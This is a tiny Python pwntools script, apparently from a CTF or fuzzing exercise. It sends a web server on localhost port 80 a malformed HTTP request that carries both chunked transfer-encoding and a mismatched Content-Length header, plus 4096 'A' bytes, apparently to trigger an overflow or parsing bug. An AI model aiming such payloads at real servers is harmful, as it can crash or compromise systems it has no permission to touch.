from pwn import *

r = remote('localhost', 80)



payload = 'GET / HTTP/1.0\n'
payload += 'transfer-encoding: chunked\n'
payload += "Content-Length: 1001\n\n"
payload += 'A' * 0x1000 + '\n'

#open('./input', 'w').write(payload)
r.send(payload)
#r.interactive()
r.close()